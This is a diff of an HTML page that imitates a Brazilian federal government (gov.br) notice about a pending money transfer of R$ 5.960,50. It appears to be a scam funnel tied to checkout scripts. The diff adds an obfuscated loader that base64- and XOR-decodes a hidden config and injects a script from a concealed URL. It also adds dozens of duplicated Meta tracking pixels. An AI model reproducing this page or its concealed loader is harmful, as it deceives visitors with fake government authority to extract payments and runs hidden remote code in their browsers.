@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Problemas na Transferência - Governo Federal</title>
-  <link rel="icon" href="../../assets/images/favicon.ico" type="image/x-icon">
+  <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
 
   <!-- Fontes -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -23,6 +23,721 @@
       y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "piq8he80s8");
   </script>
+
+<script src="../../utm-tracking.js"></script>
+
+
+
+
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+
 
   <!-- Meta Pixel Code -->
   
@@ -43,8 +758,8 @@
       src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1" />
   </noscript>
   
-<script src="../../kiwify-api.js"></script>
-<script src="kiwify-api.js"></script>
+<script src="../../checkout/Upsells/03/pepper-api.js"></script>
+
 </head>
 <body>
   <!-- 1. Cabeçalho Oficial Gov.br -->
@@ -55,6 +770,103 @@
       </a>
     </div>
   </header>
+
+
+
+<style>
+/* Mantém o espaço dos elementos durante a animação */
+.status-item,
+.status-final {
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(8px);
+  pointer-events: none;
+
+  transition:
+    opacity 350ms ease,
+    transform 350ms ease,
+    visibility 350ms ease;
+}
+
+/* Estado visível */
+.status-item.is-visible,
+.status-final.is-visible {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(0);
+  pointer-events: auto;
+}
+
+/* Indicador de carregamento */
+.status-loader {
+  width: 22px;
+  height: 22px;
+  border: 3px solid #d1d5db;
+  border-top-color: #2563eb;
+  border-radius: 50%;
+  animation: status-spin 700ms linear infinite;
+  margin: 16px auto;
+}
+
+.status-loader[hidden] {
+  display: none;
+}
+
+@keyframes status-spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* Elementos ocultos durante a sequência */
+.hidden {
+  display: none !important;
+}
+
+/* Indicadores de carregamento */
+.loading {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 18px 0;
+}
+
+/* Spinner */
+.spinner {
+  width: 28px;
+  height: 28px;
+  border: 3px solid #d1d5db;
+  border-top-color: #2865AE;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* Respeita quem prefere menos movimento */
+@media (prefers-reduced-motion: reduce) {
+  .status-item,
+  .status-final {
+    transition: none;
+    transform: none;
+  }
+
+  .status-loader {
+    animation-duration: 1.8s;
+  }
+
+  .spinner {
+    animation-duration: 2s;
+  }
+}
+</style>
+
+
+  <script src="js/animacao.js"></script>
 
   <!-- 2. Área Principal com Fundo Azul Escuro -->
   <main class="acesso-main-section">
@@ -68,61 +880,538 @@
         <div class="amount-value">R$ 5.960,50</div>
       </div>
 
-      <h1 class="section-title">Problemas na transferência</h1>
+<h1 class="section-title">Problemas na transferência</h1>
 
-      <!-- 3. Caixa Cinza de Notificações -->
-      <div class="problemas-container" id="ad2">
-        <!-- Item 1: Engrenagem Laranja -->
-        <div class="item-card" id="text1">
-          <div class="icon-circle icon-orange">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <circle cx="12" cy="12" r="3"></circle>
-              <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
-            </svg>
-          </div>
-          <div class="item-text">
-            Estamos identificando o problema nos seus dados!
-          </div>
-        </div>
+<!-- COMPONENTE DE STATUS: substitua os blocos antigos de status por este único componente -->
+<style>
+  /* Escopo isolado para evitar conflitos com o CSS restante da página. */
+  #transferStatusWidget,
+  #transferStatusWidget * {
+    box-sizing: border-box;
+  }
 
-        <!-- Item 2: Triângulo Vermelho de Aviso -->
-        <div class="item-card" id="text2">
-          <div class="icon-circle icon-red">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
-              <line x1="12" y1="9" x2="12" y2="13"></line>
-              <line x1="12" y1="17" x2="12.01" y2="17"></line>
-            </svg>
-          </div>
-          <div class="item-text">
-            Identificamos que há uma pendência nos seus dados de transferência!
-          </div>
-        </div>
+  #transferStatusWidget {
+    width: 100%;
+    max-width: 375px;
+    margin: 0 auto;
+    padding: 24px 20px 18px;
+    border-radius: 22px;
+    background: #e5e5e5;
+    color: #333;
+    font-family: Arial, Helvetica, sans-serif;
+  }
 
-        <!-- Item 3: Alerta Vermelho -->
-        <div class="alert-card-red" id="text3">
-          <div class="icon-white-circle">
-            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#DC2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <line x1="12" y1="8" x2="12" y2="12"></line>
-              <line x1="12" y1="16" x2="12.01" y2="16"></line>
-            </svg>
-          </div>
-          <div class="alert-red-text">
